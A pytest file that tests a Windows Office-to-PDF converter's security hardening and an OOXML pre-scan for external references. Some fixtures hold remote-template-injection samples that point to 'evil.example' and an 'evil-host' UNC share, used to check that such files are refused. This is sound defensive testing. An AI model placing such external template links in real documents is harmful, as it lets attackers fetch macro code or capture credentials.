"""Office (Word/Excel/PowerPoint) → PDF conversion logic.

Real Office automation can't run in a unit test (needs Office + COM + a desktop),
so win32com/pythoncom are mocked. The SaveAs/ExportAsFixedFormat mock writes a real
%PDF to the out path so office_via_com's read-back + %PDF check pass. These tests lock:
  • the per-format COM app + PDF format code (Word 17, Excel 0, PowerPoint 32),
  • the security hardening (macros off, ReadOnly, no external-link auto-update),
  • the unsupported-type guard,
so the pywin32 bump (and future edits) can't silently regress them.
"""
import sys

import pytest

pytestmark = pytest.mark.skipif(sys.platform != "win32", reason="win32com is Windows-only")

from unittest.mock import MagicMock, patch  # noqa: E402

from universal_importer.converters import office_via_com  # noqa: E402

_PDF = b"%PDF-1.4\n1 0 obj<<>>endobj\n%%EOF\n"


def _no_com():
    """Patch COM init/uninit to no-ops (real CoInitialize would touch the thread)."""
    return patch("pythoncom.CoInitialize"), patch("pythoncom.CoUninitialize")


def test_word_docx_readonly_no_linkupdate_pdf(tmp_path):
    src = tmp_path / "Rechnung.docx"
    src.write_bytes(b"stub")
    word = MagicMock()
    doc = word.Documents.Open.return_value
    doc.SaveAs.side_effect = lambda out, *a, **k: open(out, "wb").write(_PDF)

    ci, cu = _no_com()
    with ci, cu, patch("win32com.client.Dispatch", return_value=word) as disp:
        result = office_via_com(str(src), ".docx")

    disp.assert_called_once_with("Word.Application")
    assert word.AutomationSecurity == 3                       # macros/DDE disabled
    assert word.Options.UpdateLinksAtOpen is False            # no external-link refresh
    _, open_kw = word.Documents.Open.call_args
    assert open_kw.get("ReadOnly") is True
    assert open_kw.get("AddToRecentFiles") is False
    _, save_kw = doc.SaveAs.call_args
    assert save_kw.get("FileFormat") == 17                    # 17 = PDF
    assert doc.Close.called and word.Quit.called
    assert result.name == "Rechnung.pdf"
    assert result.data.getvalue().startswith(b"%PDF")


def test_excel_xlsx_readonly_no_linkupdate_pdf(tmp_path):
    src = tmp_path / "Tabelle.xlsx"
    src.write_bytes(b"stub")
    excel = MagicMock()
    wb = excel.Workbooks.Open.return_value
    wb.ExportAsFixedFormat.side_effect = lambda fmt, out, *a, **k: open(out, "wb").write(_PDF)

    ci, cu = _no_com()
    with ci, cu, patch("win32com.client.Dispatch", return_value=excel) as disp:
        result = office_via_com(str(src), ".xlsx")

    disp.assert_called_once_with("Excel.Application")
    assert excel.AutomationSecurity == 3
    assert excel.AskToUpdateLinks is False
    _, open_kw = excel.Workbooks.Open.call_args
    assert open_kw.get("UpdateLinks") == 0                    # don't update external links
    assert open_kw.get("ReadOnly") is True
    fmt_arg = wb.ExportAsFixedFormat.call_args[0][0]
    assert fmt_arg == 0                                       # 0 = PDF
    assert result.data.getvalue().startswith(b"%PDF")


def test_powerpoint_pptx_readonly_pdf(tmp_path):
    src = tmp_path / "Folien.pptx"
    src.write_bytes(b"stub")
    pp = MagicMock()
    ppt = pp.Presentations.Open.return_value
    ppt.SaveAs.side_effect = lambda out, fmt, *a, **k: open(out, "wb").write(_PDF)

    ci, cu = _no_com()
    with ci, cu, patch("win32com.client.Dispatch", return_value=pp) as disp:
        result = office_via_com(str(src), ".pptx")

    disp.assert_called_once_with("PowerPoint.Application")
    assert pp.AutomationSecurity == 3
    _, open_kw = pp.Presentations.Open.call_args
    assert open_kw.get("ReadOnly") is True
    assert open_kw.get("WithWindow") is False
    fmt_arg = ppt.SaveAs.call_args[0][1]
    assert fmt_arg == 32                                      # 32 = PDF
    assert result.data.getvalue().startswith(b"%PDF")


def test_unsupported_office_type_raises(tmp_path):
    src = tmp_path / "x.odt"
    src.write_bytes(b"stub")
    ci, cu = _no_com()
    with ci, cu, patch("win32com.client.Dispatch") as disp:
        with pytest.raises(ValueError, match="Nicht unterstützter"):
            office_via_com(str(src), ".odt")
    disp.assert_not_called()                                  # bails before any COM app


def test_nonpdf_output_rejected(tmp_path):
    """If SaveAs produces something that isn't a PDF, office_via_com must reject it."""
    src = tmp_path / "Rechnung.docx"
    src.write_bytes(b"stub")
    word = MagicMock()
    doc = word.Documents.Open.return_value
    doc.SaveAs.side_effect = lambda out, *a, **k: open(out, "wb").write(b"not a pdf")

    ci, cu = _no_com()
    with ci, cu, patch("win32com.client.Dispatch", return_value=word):
        with pytest.raises(ValueError, match="kein gültiges PDF"):
            office_via_com(str(src), ".docx")


# --- OOXML external-reference pre-scan (attached template / linked content) ----
import zipfile as _zipfile  # noqa: E402

from universal_importer.converters import scan_ooxml_external_targets  # noqa: E402

_RELS_TPL = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
             '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
             '{rels}</Relationships>')


def _docx_with_rels(tmp_path, rels_xml, member="word/_rels/settings.xml.rels"):
    path = tmp_path / "doc.docx"
    with _zipfile.ZipFile(path, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr(member, _RELS_TPL.format(rels=rels_xml))
    return str(path)


def test_scan_flags_remote_attached_template(tmp_path):
    p = _docx_with_rels(tmp_path,
        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/'
        '2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" '
        'TargetMode="External"/>')
    assert scan_ooxml_external_targets(p) == "https://evil.example/t.dotm"


def test_scan_flags_unc_target(tmp_path):
    p = _docx_with_rels(tmp_path,
        '<Relationship Id="rId1" Type=".../attachedTemplate" '
        r'Target="\\evil-host\share\t.dotm" TargetMode="External"/>')
    assert scan_ooxml_external_targets(p) == r"\\evil-host\share\t.dotm"


def test_scan_allows_hyperlinks_and_internal_rels(tmp_path):
    p = _docx_with_rels(tmp_path,
        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/'
        '2006/relationships/hyperlink" Target="https://example.org" TargetMode="External"/>'
        '<Relationship Id="rId2" Type=".../styles" Target="styles.xml"/>')
    assert scan_ooxml_external_targets(p) is None  # hyperlinks are not fetched on open


def test_scan_ignores_non_zip_legacy_files(tmp_path):
    legacy = tmp_path / "old.doc"
    legacy.write_bytes(b"\xd0\xcf\x11\xe0 legacy OLE stub")
    assert scan_ooxml_external_targets(str(legacy)) is None


def test_office_via_com_refuses_external_template_before_any_com(tmp_path):
    p = _docx_with_rels(tmp_path,
        '<Relationship Id="rId1" Type=".../attachedTemplate" '
        'Target="https://evil.example/t.dotm" TargetMode="External"/>')
    ci, cu = _no_com()
    with ci, cu, patch("win32com.client.Dispatch") as disp:
        with pytest.raises(ValueError, match="externe Vorlage/Quelle"):
            office_via_com(p, ".docx")
    disp.assert_not_called()  # refused BEFORE Word could resolve the template


def test_word_quit_runs_even_when_conversion_fails(tmp_path):
    # a failed SaveAs must not leak a hidden WINWORD process — Quit always runs
    src = tmp_path / "Rechnung.docx"
    src.write_bytes(b"stub")
    word = MagicMock()
    doc = word.Documents.Open.return_value
    doc.SaveAs.side_effect = RuntimeError("COM exploded")

    ci, cu = _no_com()
    with ci, cu, patch("win32com.client.Dispatch", return_value=word):
        with pytest.raises(RuntimeError, match="COM exploded"):
            office_via_com(str(src), ".docx")
    assert doc.Close.called and word.Quit.called
